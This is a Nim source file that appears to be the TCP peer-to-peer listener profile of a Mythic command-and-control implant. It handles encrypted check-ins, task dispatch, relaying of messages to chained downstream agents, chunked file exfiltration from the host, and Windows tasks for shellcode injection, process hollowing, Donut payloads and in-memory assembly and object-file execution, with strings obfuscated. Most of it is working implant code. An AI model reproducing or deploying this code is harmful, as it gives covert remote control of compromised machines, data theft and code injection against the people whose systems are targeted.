import std/[base64, strutils, json, random, os, asyncdispatch, asyncnet, nativesockets, tables]
import ../config
import ../utils/crypto
import ../utils/debug
import ../utils/strenc
import ../utils/task_processor
import ../tasks/download
import ../tasks/upload
import ../tasks/connect

# Import Windows-specific tasks for chunk processing
when defined(windows):
  import ../tasks/link
  import ../tasks/execute_assembly
  import ../tasks/inline_execute
  import ../tasks/shinject
  import ../tasks/donut
  import ../tasks/inject_hollow

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]

when encryptedExchange:
  import ../utils/key_exchange

# Forward declaration for Agent type (defined in agent.nim)
type Agent* = object

# Background task types for P2P agent
type
  BackgroundTaskType = enum
    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
    fileData: seq[byte]
    params: JsonNode  # Store original params for file-based tasks

type
  TcpProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]
    port: Port
    server: AsyncSocket
    listening: bool
    callbackUuid*: string

proc newTcpProfile*(): TcpProfile =
  ## Create a new TCP P2P profile (listener)
  result = TcpProfile()
  result.config = getConfig()
  result.port = Port(parseInt(result.config.callbackPort))
  result.server = newAsyncSocket()
  result.listening = false
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  
  debug "[DEBUG] TCP P2P Profile: Created (will listen on port ", result.config.callbackPort, ")"


proc sendChunkedMessage(socket: AsyncSocket, message: string): Future[void] {.async.} =
  ## Send a length-prefixed chunked message (4-byte big-endian length + data)
  let messageLen = message.len.uint32
  var lenBytes: array[4, byte]
  
  # Convert to big-endian
  lenBytes[0] = byte((messageLen shr 24) and 0xFF)
  lenBytes[1] = byte((messageLen shr 16) and 0xFF)
  lenBytes[2] = byte((messageLen shr 8) and 0xFF)
  lenBytes[3] = byte(messageLen and 0xFF)
  
  debug "[DEBUG] TCP P2P: Sending message length: ", messageLen, " bytes"
  
  # Send length prefix
  await socket.send(addr lenBytes[0], 4)
  
  # Send message data
  await socket.send(message)
  
  debug "[DEBUG] TCP P2P: Message sent successfully"

proc receiveChunkedMessage(socket: AsyncSocket): Future[string] {.async.} =
  ## Receive a length-prefixed chunked message
  var lenBytes: array[4, byte]
  
  # Read 4-byte length prefix
  let readLen = await socket.recvInto(addr lenBytes[0], 4)
  if readLen != 4:
    debug "[DEBUG] TCP P2P: Failed to read length prefix, got ", readLen, " bytes"
    return ""
  
  # Convert from big-endian
  let messageLen = (lenBytes[0].uint32 shl 24) or 
                   (lenBytes[1].uint32 shl 16) or 
                   (lenBytes[2].uint32 shl 8) or 
                   lenBytes[3].uint32
  
  debug "[DEBUG] TCP P2P: Expecting message of ", messageLen, " bytes"
  
  if messageLen == 0 or messageLen > 100_000_000:  # 100MB sanity check
    debug "[DEBUG] TCP P2P: Invalid message length: ", messageLen
    return ""
  
  # Read message data
  result = await socket.recv(messageLen.int)
  debug "[DEBUG] TCP P2P: Received ", result.len, " bytes"

proc encryptMessage(profile: TcpProfile, message: string, uuid: string): string =
  ## Encrypt a message with AES or just base64 encode if no key
  if profile.aesKey.len > 0 and uuid.len > 0:
    debug "[DEBUG] TCP P2P: Encrypting message with AES-256-CBC+HMAC"
    result = encryptPayload(message, profile.aesKey, uuid)
  else:
    debug "[DEBUG] TCP P2P: Encoding message (no encryption)"
    result = encode(uuid & message)

proc decryptMessage(profile: TcpProfile, message: string): string =
  ## Decrypt a message with AES or just base64 decode if no key
  if profile.aesKey.len > 0:
    debug "[DEBUG] TCP P2P: Decrypting message with AES-256-CBC+HMAC"
    result = decryptPayload(message, profile.aesKey)
  else:
    debug "[DEBUG] TCP P2P: Decoding message (no encryption)"
    let decoded = decode(message)
    if decoded.len > 36:
      result = decoded[36..^1]
    else:
      result = ""

proc sendDownloadChunk(taskId: string, fileId: string, path: string, fileData: seq[byte], chunkNum: int, totalChunks: int): JsonNode =
  ## Send a download chunk response for a P2P agent
  ## This reads from the in-memory file data
  const CHUNK_SIZE = 512000
  
  try:
    let offset = chunkNum * CHUNK_SIZE
    let remaining = fileData.len - offset
    let chunkSize = min(remaining, CHUNK_SIZE)
    
    if chunkSize <= 0 or offset >= fileData.len:
      # No more data to send - use completeDownload for proper completion
      return completeDownload(taskId, fileId, path)
    
    # Extract chunk data
    var chunkData = newSeq[byte](chunkSize)
    for i in 0..<chunkSize:
      chunkData[i] = fileData[offset + i]
    
    # Encode to base64
    let encodedChunk = encode(cast[string](chunkData))
    
    let chunkResponse = %*{
      obf("chunk_num"): chunkNum + 1,
      obf("file_id"): "",  # File ID will be provided by Mythic
      obf("chunk_data"): encodedChunk,
      obf("chunk_size"): chunkSize
    }
    
    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): "Error reading chunk: " & e.msg
    }

proc receiveUploadChunk(taskId: string, params: JsonNode, fileData: var seq[byte], chunkNum: int): JsonNode =
  ## Receive and process an upload chunk for a P2P agent
  const CHUNK_SIZE = 512000
  
  try:
    # Extract chunk data from parameters
    if not params.hasKey(obf("file_id")) or not params.hasKey(obf("chunk_data")):
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): "Missing file_id or chunk_data in background_task"
      }
    
    let fileId = params[obf("file_id")].getStr()
    let chunkData = params[obf("chunk_data")].getStr()
    let totalChunks = if params.hasKey(obf("total_chunks")): params[obf("total_chunks")].getInt() else: 0
    let fullPath = if params.hasKey(obf("full_path")): params[obf("full_path")].getStr() else: ""
    
    # Decode the chunk
    let decodedData = decode(chunkData)
    
    # Append to file data
    for c in decodedData:
      fileData.add(byte(c))
    
    # Check if this is the last chunk
    if totalChunks > 0 and chunkNum >= totalChunks:
      # Write all data to file
      var file = open(fullPath, fmWrite)
      defer: file.close()
      
      discard file.writeBytes(fileData, 0, fileData.len)
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): "Uploaded '" & fullPath & "'"
      }
    else:
      # Request next chunk
      return %*{
        obf("upload"): {
          obf("chunk_size"): CHUNK_SIZE,
          obf("file_id"): fileId,
          obf("chunk_num"): chunkNum + 1,
          obf("full_path"): fullPath
        },
        obf("task_id"): taskId,
        obf("user_output"): "Uploading chunk " & $(chunkNum + 1) & "/" & $totalChunks & "\n"
      }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): "Error processing upload chunk: " & e.msg
    }

proc forwardIncomingDelegates*(msgJson: JsonNode) =
  ## Forward any incoming delegates from a message to downstream P2P agents
  ## This enables multi-level P2P chaining (e.g., HTTP <- TCP <- SMB)
  if msgJson.hasKey(obf("delegates")):
    let delegates = msgJson[obf("delegates")]
    for delegate in delegates:
      if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
        let delegateUuid = delegate[obf("uuid")].getStr()
        let delegateMsg = delegate[obf("message")].getStr()
        debug "[DEBUG] TCP P2P: Forwarding delegate to downstream agent ", delegateUuid
        discard forwardDelegateToConnect(delegateUuid, delegateMsg)
        when defined(windows):
          discard forwardDelegateToLink(delegateUuid, delegateMsg)
        # Handle rekeying if Mythic assigned a new UUID
        if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
          let newUuid = if delegate.hasKey(obf("new_uuid")):
            delegate[obf("new_uuid")].getStr()
          else:
            delegate[obf("mythic_uuid")].getStr()
          if newUuid != delegateUuid:
            debug "[DEBUG] TCP P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
            discard rekeyConnectConnection(delegateUuid, newUuid)
            when defined(windows):
              discard rekeyLinkConnection(delegateUuid, newUuid)

proc collectDownstreamDelegates*(): tuple[delegates: JsonNode, edges: JsonNode] =
  ## Collect delegate and edge data from all downstream P2P connections
  ## Used by P2P profile agents to relay data from further-downstream agents
  var delegates = newJArray()
  var edges = newJArray()
  
  let connectResps = checkActiveConnectConnections()
  for resp in connectResps:
    if resp.hasKey(obf("delegates")):
      for d in resp[obf("delegates")]:
        delegates.add(d)
    elif resp.hasKey(obf("edges")):
      for e in resp[obf("edges")]:
        edges.add(e)
  
  when defined(windows):
    let linkResps = checkActiveLinkConnections()
    for resp in linkResps:
      if resp.hasKey(obf("delegates")):
        for d in resp[obf("delegates")]:
          delegates.add(d)
      elif resp.hasKey(obf("edges")):
        for e in resp[obf("edges")]:
          edges.add(e)
  
  return (delegates, edges)

proc startListening*(profile: TcpProfile): Future[void] {.async.} =
  ## Start listening for P2P connections
  if profile.listening:
    debug "[DEBUG] TCP P2P: Already listening"
    return
  
  try:
    profile.server.setSockOpt(OptReuseAddr, true)
    profile.server.bindAddr(profile.port, "0.0.0.0")
    profile.server.listen()
    profile.listening = true
    debug "[DEBUG] TCP P2P: Listening on 0.0.0.0:", profile.port.int
  except Exception as e:
    debug "[DEBUG] TCP P2P: Failed to start listening: ", e.msg
    profile.listening = false

proc send*(profile: TcpProfile, data: string, callbackUuid: string = ""): string =
  ## For TCP P2P, send is not used directly - communication happens through handleClient
  ## This is here for interface compatibility with other profiles
  debug "[DEBUG] TCP P2P: send() called but TCP is a listener profile (P2P)"
  result = ""

proc start*(profile: TcpProfile) {.async.} =
  ## Start the TCP P2P listener and handle clients
  ## This is the main entry point for TCP profile agents
  debug "[DEBUG] TCP P2P: Starting TCP listener agent"
  
  # Start listening
  await profile.startListening()
  
  if not profile.listening:
    debug "[DEBUG] TCP P2P: Failed to start listening, exiting"
    return
  
  debug "[DEBUG] TCP P2P: Server started, waiting for connections"
  
  # Main accept loop - runs until process exits
  while true:
    try:
      # Accept new client
      let client = await profile.server.accept()
      debug "[DEBUG] TCP P2P: New client connected"
      
      debug "[DEBUG] TCP P2P: Sending checkin to link agent"
      
      # Build checkin with actual system info using reusable function
      let checkinMsg = buildCheckinInfo()
      
      let checkinData = profile.encryptMessage($checkinMsg, profile.callbackUuid)
      await sendChunkedMessage(client, checkinData)
      
      debug "[DEBUG] TCP P2P: Waiting for checkin response from Mythic (via link agent)"
      
      # Wait for checkin response (will come from Mythic via the linking agent)
      let checkinResp = await receiveChunkedMessage(client)
      if checkinResp.len == 0:
        debug "[DEBUG] TCP P2P: No checkin response, closing client"
        client.close()
        continue
      
      let checkinRespData = profile.decryptMessage(checkinResp)
      debug "[DEBUG] TCP P2P: Received checkin response from Mythic"
      
      # Parse checkin response to get our callback UUID
      try:
        let checkinJson = parseJson(checkinRespData)
        if checkinJson.hasKey(obf("id")):
          profile.callbackUuid = checkinJson[obf("id")].getStr()
          debug "[DEBUG] TCP P2P: Callback UUID updated to: ", profile.callbackUuid
      except Exception as e:
        debug "[DEBUG] TCP P2P: Failed to parse checkin response: ", e.msg
      
      # Enter client message loop
      # In a full implementation, spawn this as a separate task
      # For now, handle synchronously
      debug "[DEBUG] TCP P2P: Entering client message loop"
      
      # Track background tasks for this connection (persists across message cycles)
      var backgroundTasks = initTable[string, BackgroundTaskState]()
      var clientShouldExit = false
      
      while true:
        try:
          # Wait for message from client
          debug "[DEBUG] TCP P2P: Waiting for message from linking agent..."
          let clientMsg = await receiveChunkedMessage(client)
          if clientMsg.len == 0:
            debug "[DEBUG] TCP P2P: Client disconnected"
            break
          
          debug "[DEBUG] TCP P2P: Received ", clientMsg.len, " bytes from linking agent"
          let decrypted = profile.decryptMessage(clientMsg)
          debug "[DEBUG] TCP P2P: Decrypted message (", decrypted.len, " bytes): ", decrypted[0..min(100, decrypted.len-1)]
          
          # Check for special actions
          try:
            let msgJson = parseJson(decrypted)
            debug "[DEBUG] TCP P2P: Parsed JSON, checking for action or responses..."
            
            # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
            forwardIncomingDelegates(msgJson)
            
            # Check for responses array (post_response from Mythic)
            if msgJson.hasKey(obf("responses")):
              debug "[DEBUG] TCP P2P: Received post_response with responses array from Mythic"
              
              let responses = msgJson[obf("responses")]
              var chunksToSend = newJArray()
              
              for resp in responses:
                let taskId = resp[obf("task_id")].getStr()
                
                # Handle chunk_data (Mythic sending file chunks to P2P agent for upload-type tasks)
                if resp.hasKey(obf("chunk_data")):
                  debug "[DEBUG] TCP P2P: Received chunk_data from Mythic for task ", taskId
                  
                  if backgroundTasks.hasKey(taskId):
                    var state = backgroundTasks[taskId]
                    let chunkData = resp[obf("chunk_data")].getStr()
                    let totalChunks = resp[obf("total_chunks")].getInt()
                    state.totalChunks = totalChunks
                    
                    case state.taskType
                    of btUpload:
                      # Process upload chunk
                      let isFirstChunk = (state.currentChunk == 1)
                      let uploadResp = processUploadChunk(taskId, state.fileId, state.path,
                                                           state.currentChunk, chunkData, totalChunks, isFirstChunk)
                      chunksToSend.add(uploadResp)
                      
                      if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                        backgroundTasks.del(taskId)
                        debug "[DEBUG] TCP P2P: Upload complete"
                      else:
                        state.currentChunk += 1
                        backgroundTasks[taskId] = state
                    
                    of btExecuteAssembly:
                      when defined(windows):
                        let execResp = processExecuteAssemblyChunk(
                          taskId, state.params, chunkData, totalChunks,
                          state.currentChunk, state.fileData
                        )
                        chunksToSend.add(execResp)
                        
                        if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                          backgroundTasks.del(taskId)
                          debug "[DEBUG] TCP P2P: Execute-assembly complete"
                        else:
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
                    
                    of btInlineExecute:
                      when defined(windows):
                        let bofResp = processInlineExecuteChunk(
                          taskId, state.params, chunkData, totalChunks,
                          state.currentChunk, state.fileData
                        )
                        chunksToSend.add(bofResp)
                        
                        if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                          backgroundTasks.del(taskId)
                          debug "[DEBUG] TCP P2P: Inline_execute complete"
                        else:
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
                    
                    of btShinject:
                      when defined(windows):
                        let injectResp = processShinjectChunk(
                          taskId, state.params, chunkData, totalChunks,
                          state.currentChunk, state.fileData
                        )
                        chunksToSend.add(injectResp)
                        
                        if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                          backgroundTasks.del(taskId)
                          debug "[DEBUG] TCP P2P: Shinject complete"
                        else:
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
                    
                    of btDonut:
                      when defined(windows):
                        let donutResp = processDonutChunk(
                          taskId, state.params, chunkData, totalChunks,
                          state.currentChunk, state.fileData
                        )
                        chunksToSend.add(donutResp)
                        
                        if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                          backgroundTasks.del(taskId)
                          debug "[DEBUG] TCP P2P: Donut complete"
                        else:
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
                    
                    of btInjectHollow:
                      when defined(windows):
                        let hollowResp = processInjectHollowChunk(
                          taskId, state.params, chunkData, totalChunks,
                          state.currentChunk, state.fileData
                        )
                        chunksToSend.add(hollowResp)
                        
                        if hollowResp.hasKey(obf("completed")) and hollowResp[obf("completed")].getBool():
                          backgroundTasks.del(taskId)
                          debug "[DEBUG] TCP P2P: Inject hollow complete"
                        else:
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
                    
                    of btDownload:
                      # This shouldn't happen - download sends chunks, doesn't receive them
                      debug "[DEBUG] TCP P2P: ERROR - received chunk_data for download task!"
                  
                  continue
                
                # Handle file_id assignment and chunk acknowledgments (for download tasks)
                if resp.hasKey(obf("task_id")) and resp.hasKey(obf("file_id")):
                  let fileId = resp[obf("file_id")].getStr()
                  
                  # Check if this is a chunk acknowledgment (has chunk_num)
                  if resp.hasKey(obf("chunk_num")):
                    let chunkNum = resp[obf("chunk_num")].getInt()
                    debug "[DEBUG] TCP P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
                    
                    # Send next chunk if download is still in progress
                    if backgroundTasks.hasKey(taskId):
                      var state = backgroundTasks[taskId]
                      if state.taskType == btDownload:
                        # Check if there are more chunks to send
                        if state.currentChunk < state.totalChunks:
                          debug "[DEBUG] TCP P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
                          let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                          
                          # Check if this was a completion message
                          if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
                            # This was the last chunk, completion message already created by sendDownloadChunk
                            chunksToSend.add(chunkResp)
                            backgroundTasks.del(taskId)
                          else:
                            # Update chunk response with file_id
                            if chunkResp.hasKey(obf("download")):
                              var download = chunkResp[obf("download")]
                              download[obf("file_id")] = %fileId
                              chunkResp[obf("download")] = download
                            
                            chunksToSend.add(chunkResp)
                            state.currentChunk += 1
                            backgroundTasks[taskId] = state
                        else:
                          # All chunks already sent, send completion using completeDownload
                          debug "[DEBUG] TCP P2P: All chunks sent, sending final completion message"
                          let completeMsg = completeDownload(taskId, fileId, state.path)
                          chunksToSend.add(completeMsg)
                          backgroundTasks.del(taskId)
                  else:
                    # Initial file_id assignment (no chunk_num)
                    debug "[DEBUG] TCP P2P: Mythic assigned file_id ", fileId, " to task ", taskId
                    
                    # Check if this is a download task waiting for file_id
                    if backgroundTasks.hasKey(taskId):
                      var state = backgroundTasks[taskId]
                      if state.taskType == btDownload and state.fileId.len == 0:
                        # Update with file_id and send first chunk
                        state.fileId = fileId
                        backgroundTasks[taskId] = state
                        
                        debug "[DEBUG] TCP P2P: Starting chunk uploads for download task"
                        let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                        
                        # Check if this was a completion message
                        if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
                          # This was the last chunk, completion message already created by sendDownloadChunk
                          chunksToSend.add(chunkResp)
                          backgroundTasks.del(taskId)
                        else:
                          # Update chunk response with file_id
                          if chunkResp.hasKey(obf("download")):
                            var download = chunkResp[obf("download")]
                            download[obf("file_id")] = %fileId
                            chunkResp[obf("download")] = download
                          
                          chunksToSend.add(chunkResp)
                          state.currentChunk += 1
                          backgroundTasks[taskId] = state
              
              # If we have chunks to send, send them now
              if chunksToSend.len > 0:
                # Collect downstream delegate data (multi-level P2P)
                let (downDelegates, downEdges) = collectDownstreamDelegates()
                for e in downEdges:
                  chunksToSend.add(e)
                
                let chunkResponse = %* {
                  obf("action"): obf("post_response"),
                  obf("responses"): chunksToSend
                }
                if downDelegates.len > 0:
                  chunkResponse[obf("delegates")] = downDelegates
                  debug "[DEBUG] TCP P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                
                debug "[DEBUG] TCP P2P: Sending ", chunksToSend.len, " download chunk(s)"
                let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                await sendChunkedMessage(client, responseEncrypted)
                continue
              
              # No chunks to send - check if there's downstream delegate data to relay
              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegates()
              if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
                let delegateResponse = %* {
                  obf("action"): obf("post_response"),
                  obf("responses"): noChunkEdges
                }
                if noChunkDelegates.len > 0:
                  delegateResponse[obf("delegates")] = noChunkDelegates
                  debug "[DEBUG] TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                await sendChunkedMessage(client, responseEncrypted)
              else:
                # Always respond to keep the relay chain alive (multi-level P2P)
                # Without this, the parent agent never gets data from us, Mythic never
                # sends new delegates, and downstream responses get stuck permanently
                let getTaskingMsg = %* {
                  obf("action"): obf("get_tasking"),
                  obf("tasking_size"): -1
                }
                debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no chunks, no downstream data)"
                let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
                await sendChunkedMessage(client, responseEncrypted)
              continue
            
            # Check for action field
            elif msgJson.hasKey(obf("action")):
              let action = msgJson[obf("action")].getStr()
              debug "[DEBUG] TCP P2P: Received action: ", action
              
              if action == obf("checkin"):
                # Checkin response from Mythic
                debug "[DEBUG] TCP P2P: Processing checkin response"
                if msgJson.hasKey(obf("status")) and msgJson[obf("status")].getStr() == "success":
                  if msgJson.hasKey(obf("id")):
                    profile.callbackUuid = msgJson[obf("id")].getStr()
                    debug "[DEBUG] TCP P2P: Updated callback UUID to: ", profile.callbackUuid
                
                # Don't send response - just update UUID and continue
                continue
                
              elif action == obf("get_tasking"):
                # This is a get_tasking response from Mythic containing tasks to execute
                debug "[DEBUG] TCP P2P: Received get_tasking response with tasks"
                
                # Extract and process tasks
                if msgJson.hasKey(obf("tasks")) and msgJson[obf("tasks")].len > 0:
                  let tasks = msgJson[obf("tasks")]
                  debug "[DEBUG] TCP P2P: Received ", tasks.len, " task(s) to execute"
                  
                  # Process each task and collect responses
                  var taskResponses = newJArray()
                  var shouldExit = false
                  for task in tasks:
                      let taskId = task[obf("id")].getStr()
                      let command = task[obf("command")].getStr()
                      
                      # Check if this is a background_task message (file upload/download chunks)
                      if command == obf("background_task"):
                        debug "[DEBUG] TCP P2P: Processing background_task for ", taskId
                        
                        # Parse parameters
                        var params = newJObject()
                        if task.hasKey(obf("parameters")):
                          let paramStr = task[obf("parameters")].getStr()
                          if paramStr.len > 0:
                            try:
                              params = parseJson(paramStr)
                            except:
                              debug "[DEBUG] Failed to parse background_task parameters"
                        
                        # Handle background task based on type
                        if backgroundTasks.hasKey(taskId):
                          var state = backgroundTasks[taskId]
                          
                          case state.taskType
                          of btDownload:
                            # Send next chunk
                            let chunkResponse = sendDownloadChunk(taskId, state.fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                            taskResponses.add(chunkResponse)
                            
                            # Check if this was the last chunk (completeDownload returns completed=true)
                            if chunkResponse.hasKey(obf("completed")) and chunkResponse[obf("completed")].getBool():
                              backgroundTasks.del(taskId)
                              debug "[DEBUG] TCP P2P: Download complete"
                            else:
                              state.currentChunk += 1
                              backgroundTasks[taskId] = state
                          
                          of btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow:
                            # Upload and other file-receiving tasks are handled via chunk_data in responses
                            # background_task messages don't apply to these
                            debug "[DEBUG] TCP P2P: background_task not applicable for upload-type tasks"
                        else:
                          debug "[DEBUG] TCP P2P: No background task state for ", taskId
                        
                      
                      # Parse parameters - Mythic sends it as a JSON string
                      var params = newJObject()
                      if task.hasKey(obf("parameters")):
                        let paramStr = task[obf("parameters")].getStr()
                        if paramStr.len > 0:
                          try:
                            params = parseJson(paramStr)
                          except:
                            debug "[DEBUG] Failed to parse parameters: " & paramStr
                      
                      # Execute task using task_processor
                      let execResult = executeTask(taskId, command, params)
                      
                      # Check if we should exit
                      if execResult.shouldExit:
                        debug "[DEBUG] TCP P2P: Exit command received"
                        taskResponses.add(execResult.response)
                        shouldExit = true
                        # Don't process any more tasks
                        break
                      
                      # Handle download command specially (needs in-memory file loading)
                      if command == obf("download") and execResult.needsBackgroundTracking:
                        debug "[DEBUG] TCP P2P: Starting download"
                        taskResponses.add(execResult.response)
                        
                        # Track as background task for chunk handling
                        var state = BackgroundTaskState(
                          taskType: btDownload,
                          path: params[obf("path")].getStr(),
                          fileId: "",
                          totalChunks: execResult.response[obf("download")][obf("total_chunks")].getInt(),
                          currentChunk: 0,
                          fileData: @[],
                          params: newJNull()
                        )
                        
                        # Read file into memory for chunking
                        try:
                          let filePath = params[obf("path")].getStr()
                          var f: File
                          if f.open(filePath, fmRead):
                            let fileSize = f.getFileSize()
                            state.fileData = newSeq[byte](fileSize)
                            discard f.readBytes(state.fileData, 0, fileSize)
                            f.close()
                            backgroundTasks[taskId] = state
                            debug "[DEBUG] TCP P2P: File loaded, ", fileSize, " bytes"
                        except Exception as e:
                          debug "[DEBUG] TCP P2P: Failed to read file: ", e.msg
                        
                        continue
                      
                      # Handle upload command
                      elif command == obf("upload") and execResult.needsBackgroundTracking:
                        debug "[DEBUG] TCP P2P: Starting upload"
                        taskResponses.add(execResult.response)
                        
                        # Track as background task for chunk handling
                        let uploadPath = if execResult.response.hasKey(obf("upload")):
                          execResult.response[obf("upload")][obf("full_path")].getStr()
                        else:
                          params[obf("remote_path")].getStr()
                        
                        var state = BackgroundTaskState(
                          taskType: btUpload,
                          path: uploadPath,
                          fileId: params[obf("file")].getStr(),
                          totalChunks: 0,
                          currentChunk: 1,
                          fileData: @[],
                          params: newJNull()
                        )
                        backgroundTasks[taskId] = state
                        continue
                      
                      # Handle other file-receiving tasks (Windows only)
                      elif execResult.needsBackgroundTracking and (
                        command == obf("execute_assembly") or 
                        command == obf("inline_execute") or 
                        command == obf("shinject") or 
                        command == obf("donut") or 
                        command == obf("inject_hollow")):
                        
                        when defined(windows):
                          debug "[DEBUG] TCP P2P: Starting file-receiving task: ", command
                          taskResponses.add(execResult.response)
                          
                          # Determine task type
                          let taskType = case command
                            of obf("execute_assembly"): btExecuteAssembly
                            of obf("inline_execute"): btInlineExecute
                            of obf("shinject"): btShinject
                            of obf("donut"): btDonut
                            of obf("inject_hollow"): btInjectHollow
                            else: btUpload  # Should never happen
                          
                          var state = BackgroundTaskState(
                            taskType: taskType,
                            path: "",
                            fileId: params[obf("uuid")].getStr(),
                            totalChunks: 0,
                            currentChunk: 1,
                            fileData: @[],
                            params: params
                          )
                          backgroundTasks[taskId] = state
                          continue
                        else:
                          # Not Windows - just send error response
                          taskResponses.add(execResult.response)
                      
                      # All other tasks (already executed via executeTask)
                      else:
                        taskResponses.add(execResult.response)
                  
                  # Collect downstream delegate data (multi-level P2P)
                  let (taskDelegates, taskEdges) = collectDownstreamDelegates()
                  for e in taskEdges:
                    taskResponses.add(e)
                  
                  # Send response with task results
                  let taskingResponse = %* {
                    obf("action"): obf("post_response"),
                    obf("responses"): taskResponses
                  }
                  if taskDelegates.len > 0:
                    taskingResponse[obf("delegates")] = taskDelegates
                    debug "[DEBUG] TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                  
                  debug "[DEBUG] TCP P2P: Sending ", taskResponses.len, " task response(s)"
                  let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                  await sendChunkedMessage(client, responseEncrypted)
                  
                  # If exit command was received, wait briefly for message to be received then exit
                  if shouldExit:
                    debug "[DEBUG] TCP P2P: Exit command sent, waiting 500ms for delivery before shutdown"
                    await sleepAsync(500)  # Give time for message to be received and processed
                    clientShouldExit = true
                    break
                else:
                  debug "[DEBUG] TCP P2P: No tasks in get_tasking response"
                  # Even without tasks, check for downstream delegate data to relay
                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegates()
                  if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                    let delegateResponse = %* {
                      obf("action"): obf("post_response"),
                      obf("responses"): noTaskEdges
                    }
                    if noTaskDelegates.len > 0:
                      delegateResponse[obf("delegates")] = noTaskDelegates
                      debug "[DEBUG] TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                    let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                    await sendChunkedMessage(client, responseEncrypted)
                  else:
                    # Always respond to keep the relay chain alive (multi-level P2P)
                    let getTaskingMsg = %* {
                      obf("action"): obf("get_tasking"),
                      obf("tasking_size"): -1
                    }
                    debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no tasks, no downstream data)"
                    let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
                    await sendChunkedMessage(client, responseEncrypted)
                  continue
          except:
            discard
          
        except Exception as e:
          debug "[DEBUG] TCP P2P: Error in client loop: ", e.msg
          break
      
      client.close()
      debug "[DEBUG] TCP P2P: Client handler finished"
      
      # If exit command was received, break from accept loop to shut down server
      if clientShouldExit:
        debug "[DEBUG] TCP P2P: Exit command received, shutting down server"
        break
      
    except Exception as e:
      debug "[DEBUG] TCP P2P: Error accepting client: ", e.msg
      # Continue listening
  
  # Clean shutdown
  profile.server.close()
  profile.listening = false
  debug "[DEBUG] TCP P2P: Server shut down"


proc setAesKey*(profile: var TcpProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc setAesDecKey*(profile: var TcpProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key

proc hasAesKey*(profile: TcpProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var TcpProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    debug "[DEBUG] TCP P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    debug "[DEBUG] TCP P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Use shared key exchange implementation
  when encryptedExchange:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if result.success and result.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(result.sessionKey)
      return (true, result.newUuid)
    elif result.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debug "[DEBUG] TCP P2P: Key exchange failed: ", result.error
      return (false, "")

